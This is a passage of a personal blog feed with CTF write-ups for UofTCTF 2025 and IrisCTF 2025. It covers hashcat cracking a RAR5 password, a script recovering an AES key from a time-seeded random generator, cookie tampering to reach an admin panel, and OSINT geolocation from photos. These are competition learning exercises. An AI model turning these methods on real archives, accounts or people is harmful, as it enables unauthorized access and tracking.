[c]heckpoint [f]inish [q]uit =&gt; </span><br><span class="line"></span><br><span class="line">$rar5$16$1d7cb8859a6c3c8e30a9db7a501811ac$15$280234db9d29c6ab216b74e6a89ec226$8<span class="variable">$d12d4ba211b9c642</span>:toronto416</span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 13000 (RAR5)</span><br><span class="line">Hash.Target......: $rar5$16$1d7cb8859a6c3c8e30a9db7a501811ac$15<span class="variable">$280234</span>...b9c642</span><br><span class="line">.</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/home/g4rud4/Downloads/rockyou.txt)</span><br><span class="line">.</span><br><span class="line">Progress.........: 3119104/14344384 (21.74%)</span><br><span class="line">Rejected.........: 0/3119104 (0.00%)</span><br><span class="line">Restore.Point....: 3117056/14344384 (21.73%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:32768-32799</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: torrisjames -&gt; torit13</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>It took a considerable amount of time to brute-force the password since the author had set it at the 21.74% mark of the rockyou.txt file. The password turned out to be <code>toronto416</code>.</p><p>Initially, I used unrar to extract the files, but it only retrieved flag.py and not flag.enc. To extract both files from the RAR archive, I switched to using 7z, which successfully extracted them.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">./7z x flag.rar</span><br><span class="line"></span><br><span class="line">7-Zip (z) 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-28</span><br><span class="line"> 64-bit locale=en_IN Threads:16 OPEN_MAX:1024, ASM</span><br><span class="line"></span><br><span class="line">Scanning the drive <span class="keyword">for</span> archives:</span><br><span class="line">1 file, 672 bytes (1 KiB)</span><br><span class="line"></span><br><span class="line">Extracting archive: flag.rar</span><br><span class="line">--</span><br><span class="line">Path = flag.rar</span><br><span class="line">Type = Rar5</span><br><span class="line">Physical Size = 672</span><br><span class="line">Characteristics = Locator QuickOpen:0</span><br><span class="line">Encrypted = -</span><br><span class="line">Solid = -</span><br><span class="line">Blocks = 2</span><br><span class="line">Method = v6:128K:m3</span><br><span class="line">Multivolume = -</span><br><span class="line">Volumes = 1</span><br><span class="line">    </span><br><span class="line">Enter password:toronto416</span><br><span class="line"></span><br><span class="line">Everything is Ok</span><br><span class="line"></span><br><span class="line">Files: 1</span><br><span class="line">Alternate Streams: 1</span><br><span class="line">Alternate Streams Size: 57</span><br><span class="line">Size:       609</span><br><span class="line">Compressed: 672</span><br></pre></td></tr></table></figure><p>Content of the flag.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="built_in">int</span>(time()))</span><br><span class="line">KEY = SHA256.new(<span class="built_in">str</span>(random.getrandbits(<span class="number">256</span>)).encode()).digest()</span><br><span class="line">FLAG = <span class="string">&quot;uoftctf&#123;fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_flag</span>(<span class="params">flag, key</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_EAX)</span><br><span class="line">    ciphertext, tag = cipher.encrypt_and_digest(flag.encode())</span><br><span class="line">    <span class="keyword">return</span> cipher.nonce + ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    encrypted_flag = encrypt_flag(FLAG, KEY)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(encrypted_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>Next, I created a decryption script to decrypt flag.enc and retrieve the flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_unix_timestamp</span>(<span class="params">dt_str</span>):</span><br><span class="line">    dt = datetime.strptime(dt_str, <span class="string">&quot;%Y:%m:%d %H:%M:%S%z&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(dt.timestamp())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_decrypt</span>(<span class="params">encrypted_data, timestamp</span>):</span><br><span class="line">    random.seed(timestamp)</span><br><span class="line">    </span><br><span class="line">    key = SHA256.new(<span class="built_in">str</span>(random.getrandbits(<span class="number">256</span>)).encode()).digest()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        nonce = encrypted_data[:<span class="number">16</span>]</span><br><span class="line">        ciphertext = encrypted_data[<span class="number">16</span>:]</span><br><span class="line">        </span><br><span class="line">        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)</span><br><span class="line">        decrypted = cipher.decrypt(ciphertext)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    target_time = <span class="string">&quot;2025:01:06 07:43:39+05:30&quot;</span></span><br><span class="line">    unix_timestamp = get_unix_timestamp(target_time)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        encrypted_flag = f.read()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">60</span>, <span class="number">61</span>):</span><br><span class="line">        test_timestamp = unix_timestamp + offset</span><br><span class="line">        result = try_decrypt(encrypted_flag, test_timestamp)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> result <span class="keyword">and</span> <span class="string">&quot;uoftctf&#123;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found flag at timestamp <span class="subst">&#123;test_timestamp&#125;</span>!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag not found in the tested time range&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>I ran the script and obtained the following output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python3 dec.py </span><br><span class="line"></span><br><span class="line">Found flag at timestamp 1736129619!  </span><br><span class="line">Flag: uoftctf&#123;ads_and_aes_are_one_letter_apart&#125;</span><br></pre></td></tr></table></figure><p>Finally, we got our flag.</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">uoftctf&#123;ads_and_aes_are_one_letter_apart&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="Surgery"><a href="#Surgery" class="headerlink" title="Surgery"></a>Surgery</h3><h4 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>I was thinking of getting some facial contouring plastic surgery done, but didn’t know who to go to. My friend said they had a recommendation for a doctor specializing in that, but only sent me this photo of some building. Who’s the doctor?<br>Before submitting, wrap the doctor’s name in <code>uoftctf&#123;&#125;</code>. Special characters allowed, [First] [Last] format.</p><p>For example, if the name was Jean-Pierre Brehier, the flag would be uoftctf{Jean-Pierre Brehier}</p><p>Author: windex</p><h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>We received the following image file:</p><p><img src="/images/posts/2025-uoftctf/misc/surgery/image.png" alt="Building Image"></p><p>I attempted a Google Image Search on this image with the prompt: “Where is this surgery place located?” and found this link: <a href="https://medtour.help/clinic/jk-plastic-surgery/">https://medtour.help/clinic/jk-plastic-surgery/</a>. I confirmed that this was the correct building because the image matched perfectly.</p><p>On the same site, I found the names of several doctors:</p><p><img src="/images/posts/2025-uoftctf/misc/surgery/doctors.png" alt="Doctors"></p><p>I began checking them one by one. It’s worth noting that in South Korea, names are written with the last name first, followed by the first name. So, I reversed the name order for each doctor.</p><p>After some time, I identified the correct doctor: Kim Sung-Sik.</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">uoftctf&#123;Sung-Sik</span> <span class="string">Kim&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Scavenger-Hunt"><a href="#Scavenger-Hunt" class="headerlink" title="Scavenger Hunt"></a>Scavenger Hunt</h3><h4 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>You know what to do.</p><p>Visit the website <a href="http://34.150.251.3:3000/">here</a></p><p>Author: SteakEnthusiast</p><h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>This was an easy web challenge and had many solves, so I decided to attempt it. On the main page, it was mentioned that there would be seven parts of the flag.</p><p>I inspected all the CSS and JavaScript files by viewing the page source. There was also a &#x2F;hidden_admin_panel endpoint for the admin. I gained access by modifying the cookies to change the user. One part of the flag was hidden in the headers as a key-value pair: X-Flag-Part2: c4lm_4nd_.</p><p>Altogether, we managed to collect all seven parts of the flag.</p><p>part 1: uoftctf{ju57_k33p_<br>p_a_r_t_f_i_v_e&#x3D;4pp5_<br>part4&#x3D;411_7h3_<br>part7 c0d3!!}<br>part3 1n5p3c7_<br>Part 6: 50urc3_<br>Part2: c4lm_4nd_</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">uoftctf&#123;ju57_k33p_c4lm_4nd_1n5p3c7_411_7h3_4pp5_50urc3_c0d3!!&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;UofTCTF 2025!&lt;/p&gt;
&lt;p&gt;I participated in UofTCTF 2025, organized by the University of Toronto Capture the Flag team, as a member of my inst</summary>
      
    
    
    
    <category term="CTF-Writeups" scheme="https://g4rud4kun.github.io/categories/CTF-Writeups/"/>
    
    
    <category term="forensics" scheme="https://g4rud4kun.github.io/tags/forensics/"/>
    
    <category term="misc" scheme="https://g4rud4kun.github.io/tags/misc/"/>
    
    <category term="web" scheme="https://g4rud4kun.github.io/tags/web/"/>
    
    <category term="C#" scheme="https://g4rud4kun.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>IrisCTF 2025</title>
    <link href="https://g4rud4kun.github.io/2025/01/07/IrisCTF-2025/"/>
    <id>https://g4rud4kun.github.io/2025/01/07/IrisCTF-2025/</id>
    <published>2025-01-07T15:45:10.000Z</published>
    <updated>2025-05-28T12:24:27.415Z</updated>
    
    <content type="html"><![CDATA[<p>IrisCTF 2025!</p><p>I participated in IrisCTF 2025, organized by IrisSec, as a member of the InfoSecIITR team. Our team secured an impressive 9th place globally. These writeups detail all the OSINT and Forensics challenges that I personally solved during the competition. I won the Writeup Prize for the Tracem2 Challenge ;)</p><h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="OSINT-Disclaimer"><a href="#OSINT-Disclaimer" class="headerlink" title="OSINT Disclaimer"></a>OSINT Disclaimer</h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>OSINT DISCLAIMER    50 points &#x2F;&#x2F; 786 solves</p><p>Tags: freebie</p><p>The challenges this year does not require you to contact anyone. There will be no social media accounts needed to solve these challenges. Please refrain from reaching out to individuals on social media or contacting restaurants to inquire about further details. Such actions are unnecessary and will result in consequences leading to disqualification. Solving this challenge will unlock the rest of the Open-Source Intelligence category</p><p>By: Lychi</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>The flag for this challenge was included in the challenge description.</p><p><img src="/images/posts/2025-irisctf/osint/osint_disc.png" alt="Description"></p><p>This time, the OSINT challenges were purely based on the website blog and some images. Thanks to Lychi and Bobby for creating these amazing OSINT challenges. I managed to solve all of them. </p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;sp01l_f00d_1s_b4d_mk4y&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Checking-Out-Of-Winter"><a href="#Checking-Out-Of-Winter" class="headerlink" title="Checking Out Of Winter"></a>Checking Out Of Winter</h3><h4 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2025-irisctf/osint/coow/Checking_out_desc.png" alt="Description"></p><p>Blog’s Link: <a href="https://osint-food-blog-web.chal.irisc.tf/">https://osint-food-blog-web.chal.irisc.tf/</a></p><h4 id="Message"><a href="#Message" class="headerlink" title="Message"></a>Message</h4><p>For beginners, I would say that doing OSINT challenges is really fun and makes you feel like an investigator. You just have to narrow down the useful data from all the information available to you. Always check for keywords, regional distinctions, special marks, or buildings, as the victim often leaves minor traces by mistake, which can help you identify them.</p><p>I created this writeup in detail, especially for first-time solvers. 😉</p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>In the challenge description, keywords like <em>Baja California Sur, Beach, Golf, and Hotel’s location farther from the main city</em> are traces left by the victim that can help us move forward.</p><h5 id="Exploring-the-Clues"><a href="#Exploring-the-Clues" class="headerlink" title="Exploring the Clues"></a>Exploring the Clues</h5><p>Let’s visit the website:</p><p><img src="/images/posts/2025-irisctf/osint/coow/adam_site.png" alt="Adam&#39;s Blog"></p><p><img src="/images/posts/2025-irisctf/osint/coow/adam_site2.png" alt="Adam&#39;s Stories"></p><p>On the website, we find many blogs and stories by Adam about the places he visited and the food he ate. </p><p>By matching the description, we identify that the <code>Pizza by The Water</code> blog is the most relevant one for this challenge.</p><p><img src="/images/posts/2025-irisctf/osint/coow/blog.png" alt="Pizza By The Water&#39;s Blog"></p><p>In the blog’s image, we notice the hotel’s architecture in the background, along with a pool. Since we have an image related to the location, we can perform a <a href="https://en.wikipedia.org/wiki/Reverse_image_search">Reverse Image Search</a> using Google Lens.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Note: If the location is based in Russia, Yandex is preferable for reverse image searches. Similarly, if a country has its own powerful search engine, use that for better results.</span><br></pre></td></tr></table></figure><p><img src="/images/posts/2025-irisctf/osint/coow/first_google_search.png" alt="Google Image Search"></p><p>Initially, when I searched using the full image (including the pizza and the hotel), most results were about pizzas, related sites, and posts.</p><p>To refine the search, we need to narrow down the content we are focusing on. For the next search, I used only the hotel’s image and included the location Baja California Sur. This helped narrow down the results significantly.</p><p><img src="/images/posts/2025-irisctf/osint/coow/google_image_search.png" alt="Hotel&#39;s Name"></p><p>In the refined search results, as seen above, the AI and other sites directly suggested the hotel’s name, unlike the first search. This demonstrates the importance of crafting an effective search prompt, as search engines have vast amounts of data to process.</p><h5 id="Creating-the-Flag"><a href="#Creating-the-Flag" class="headerlink" title="Creating the Flag"></a>Creating the Flag</h5><p>With the gathered information, let’s construct the flag using the defined format.</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;Hilton_Los_Cabos_Beach_and_Golf_Resort&#125;</span></span><br></pre></td></tr></table></figure><p>Hurray!!!</p><h3 id="Sleuths-and-Sweets"><a href="#Sleuths-and-Sweets" class="headerlink" title="Sleuths and Sweets"></a>Sleuths and Sweets</h3><h4 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2025-irisctf/osint/sas/desc.png" alt="Description"></p><p>Blog’s Link: <a href="https://osint-food-blog-web.chal.irisc.tf/">https://osint-food-blog-web.chal.irisc.tf/</a></p><h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>If you came directly to this challenge’s writeup, I will recommend you first read my <code>Checking Out Of Winter</code> writeup because I have made it in detail, specifying some important notes.</p><p>So again, let’s search for the keywords. I got these: <em>Japan, Crepes, Foot Traffic</em>—traces left by the victim that can help us move forward.</p><p>Let’s visit the website for this blog:</p><p><img src="/images/posts/2025-irisctf/osint/sas/blog_1.png" alt="Blog 1"><br><img src="/images/posts/2025-irisctf/osint/sas/blog_2.png" alt="Blog 2"></p><p>This time, we had 3 images. When I did a Reverse Image Search for the 1st and the 3rd images, I didn’t get much exact information because they looked very common across Japan.</p><p>When I did a Reverse Image Search for the 2nd image, I got these results:</p><p><img src="/images/posts/2025-irisctf/osint/sas/second_image_search.png" alt="Image Search"></p><p>Suggesting <code>Marion Crepe Ueno Ameyoko Store</code>, which was not the correct address for the flag. </p><h5 id="Exploring-other-way"><a href="#Exploring-other-way" class="headerlink" title="Exploring other way"></a>Exploring other way</h5><p>So this time, I tried another method. As the description mentioned Foot Traffic, I searched for the place with the highest foot traffic in Japan. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The place with the highest foot traffic in Japan is Shibuya Crossing in Tokyo, which is widely considered the busiest pedestrian crossing in the world, with thousands of people crossing at once during rush hour. </span><br></pre></td></tr></table></figure><p>I then refined my search for crepe shops near Shibuya Crossing on Google Maps. After checking several stores, I finally found the correct one, as shown below:</p><p><img src="/images/posts/2025-irisctf/osint/sas/crepes_store.png" alt="Desired Store"></p><p>Location: <a href="https://maps.app.goo.gl/9np7WRbr9eapY6dZ9">Marion Crepes Shibuya Modi</a></p><p>It had similar images to those given in the blog.</p><h5 id="Creating-the-Flag-1"><a href="#Creating-the-Flag-1" class="headerlink" title="Creating the Flag"></a>Creating the Flag</h5><p>With the gathered information, let’s construct the flag using the defined format.</p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;1_Chome_21_3_Jinnan_Shibuya&#125;</span></span><br></pre></td></tr></table></figure><p>Another one solved! 🥳 </p><h3 id="Not-Eelaborate"><a href="#Not-Eelaborate" class="headerlink" title="Not Eelaborate"></a>Not Eelaborate</h3><h4 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2025-irisctf/osint/ne/desc.png" alt="Description"></p><p>Blog’s Link: <a href="https://osint-food-blog-web.chal.irisc.tf/">https://osint-food-blog-web.chal.irisc.tf/</a></p><h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>If you came directly to this challenge’s writeup, I will recommend you first read my <code>Checking Out Of Winter</code> writeup because I have made it in detail, specifying some important notes.</p><p>So again, let’s search for the keywords. I got these: <em>Title - Eel, Deer Park, Japenese Food, Quiet Restaurant</em>- traces left by the victim that can help us move forward.</p><p>Let’s visit the website for this blog:</p><p><img src="/images/posts/2025-irisctf/osint/ne/blog.png" alt="Blog"></p><p>So, I started searching for Deer Parks in Japan and found one famous Deer Park, <code>Nara Park</code>, which helped me narrow down my search.</p><p>The food dishes mentioned in the blog hinted at the <code>Unagi Dish</code>. I then did a Reverse Image Search for the given image using the prompt <code>Unagi Dish Restaurant near Nara Park</code>. This search suggested some restaurants, and the first restaurant had a similar dish plate, as shown below:</p><p><img src="/images/posts/2025-irisctf/osint/ne/image_search.png" alt="Image Search"></p><p>Finally, search for the restaurant on Google Maps, and you will get the correct name, which is located near Nara Park.</p><p><img src="/images/posts/2025-irisctf/osint/ne/restaurant.png" alt="Restaurant"></p><p>Location: <a href="https://maps.app.goo.gl/d2VqjxsCzop5jx1y6">Edogawa Kintetsu Nara</a></p><h5 id="Creating-the-Flag-2"><a href="#Creating-the-Flag-2" class="headerlink" title="Creating the Flag"></a>Creating the Flag</h5><p>With the gathered information, let’s construct the flag using the defined format.</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;Edogawa_Kintetsu_Nara&#125;</span></span><br></pre></td></tr></table></figure><p>One more solved!</p><h3 id="Late-Night-Bite"><a href="#Late-Night-Bite" class="headerlink" title="Late Night Bite"></a>Late Night Bite</h3><h4 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2025-irisctf/osint/lnb/desc.png" alt="Description"></p><p>Blog’s Link: <a href="https://osint-food-blog-web.chal.irisc.tf/">https://osint-food-blog-web.chal.irisc.tf/</a></p><h4 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h4><p>If you came directly to this challenge’s writeup, I will recommend you first read my <code>Checking Out Of Winter</code> writeup because I have made it in detail, specifying some important notes.</p><p>This challenge was a little tricky. Let’s start.</p><p>According to the description, Adam hid his favorite hangout spot, which he had recorded in the past.</p><p>At first, I thought he didn’t directly mention the Late Night Bite blog, so I explored the other uncovered blogs but didn’t find anything useful related to the challenge.</p><p>Then, I went to the <code>About</code> section of Adam’s site.</p><p><img src="/images/posts/2025-irisctf/osint/lnb/about.png" alt="About"></p><p>In the About section, I noticed that Adam is a food blogger based in Southern California and that on Wednesdays, he stops by the farmer’s market before work.</p><p>I speculated that the farmer’s market might be the nearest location around his house. When I did a Reverse Image Search on the image provided in the About section, I realized the location was <code>Santa Monica Pier</code>.</p><p>I then did another Reverse Image Search with the prompt:</p><p><img src="/images/posts/2025-irisctf/osint/lnb/image_search.png" alt="Image Search"></p><p>I believed Adam was talking about the <code>Downtown Farmers Market</code> because of the Wednesday mention.</p><p>But I still didn’t have any clue about the restaurant’s name, so I started searching through the blog on his site again. Since I have some foundational knowledge of web dev&#x2F;exp, I began by viewing the Page Source. In the source, Adam mentioned this line:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- MY SUPER SECRET POST: &quot;late night bite&quot; --&gt;</span><br></pre></td></tr></table></figure><p>Then, I tried the robots.txt endpoint – <a href="https://osint-food-blog-web.chal.irisc.tf/robots.txt">https://osint-food-blog-web.chal.irisc.tf/robots.txt</a>.</p><p>There, I found a mention of: Sitemap: &#x2F;sitemap.xml.</p><p>I went to this endpoint and discovered every endpoint related to his blogs. After scrolling, I found a mention of the Late Night Bite blog as:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;url&gt;</span><br><span class="line">&lt;loc&gt;/late-night-bite/&lt;/loc&gt;</span><br><span class="line">&lt;lastmod&gt;2025-01-02T00:00:00-08:00&lt;/lastmod&gt;</span><br><span class="line">&lt;/url&gt;</span><br></pre></td></tr></table></figure><p>So, finally, I found the blog that was hidden by Adam.</p><p><img src="/images/posts/2025-irisctf/osint/lnb/late_night_bite_blog.png" alt="Late Night Bite Blog"></p><p>So, I quickly searched for a Modern Local Izakaya Restaurant with those features near Santa Monica on Google.</p><p>I found this helpful site:</p><p><img src="/images/posts/2025-irisctf/osint/lnb/restaurant.png" alt="Restaurants"></p><p>The first restaurant, Shirubē, was near the Downtown Farmers Market, and it also had the features mentioned by Adam.</p><h5 id="Creating-the-Flag-3"><a href="#Creating-the-Flag-3" class="headerlink" title="Creating the Flag"></a>Creating the Flag</h5><p>With the gathered information, let’s construct the flag using the defined format.</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;Shirube&#125;</span></span><br></pre></td></tr></table></figure><p><em>This marks the last challenge based on the Food Blog website. Thanks to <code>lychi</code> for creating this amazing challenge; I really enjoyed it.</em></p><h3 id="Fuel-Deal"><a href="#Fuel-Deal" class="headerlink" title="Fuel Deal"></a>Fuel Deal</h3><h4 id="Challenge-Description-5"><a href="#Challenge-Description-5" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2025-irisctf/osint/fd/desc.png" alt="Description"></p><p>Source File: <a href="/images/posts/2025-irisctf/osint/fd/fuel-deal.tar.gz">fuel-deal.tar.gz</a></p><h4 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h4><p>If you came directly to this challenge’s writeup, I will recommend you first read my <code>Checking Out Of Winter</code> writeup because I have made it in detail, specifying some important notes.</p><p>So again, let’s search for the keywords. I got this: <em>Good Fuel Deal</em>.</p><p><img src="/images/posts/2025-irisctf/osint/fd/fuel-deal.png" alt="Chal&#39;s Image"></p><p>I did a Reverse Image Search but didn’t get much of a lead. Then, I tried one of the cool tools, <a href="https://geospy.ai/">GeoSpy AI</a>, which showed me this result:</p><p><img src="/images/posts/2025-irisctf/osint/fd/geospy_ai.png" alt="GeoSpy AI&#39;s Result"></p><p>Not every time does this AI give you the correct location, but since there were mentions of Australia in my Google Image Search, I decided to try the suggested location, Melbourne, Australia.</p><p>I then searched on Google with the query: <code>Where were the cheap fuels (with the rate price mentioned in the provided image) in Melbourne?</code> and got some of these results:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The cheapest diesel available in Victoria costs 183.9 cents per litre.</span><br></pre></td></tr></table></figure><p>Then found this helpful site : <a href="https://www.carexpert.com.au/car-news/the-cheapest-petrol-and-diesel-around-australia-this-week/">https://www.carexpert.com.au/car-news/the-cheapest-petrol-and-diesel-around-australia-this-week\</a></p><p>The above site had these rates : </p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 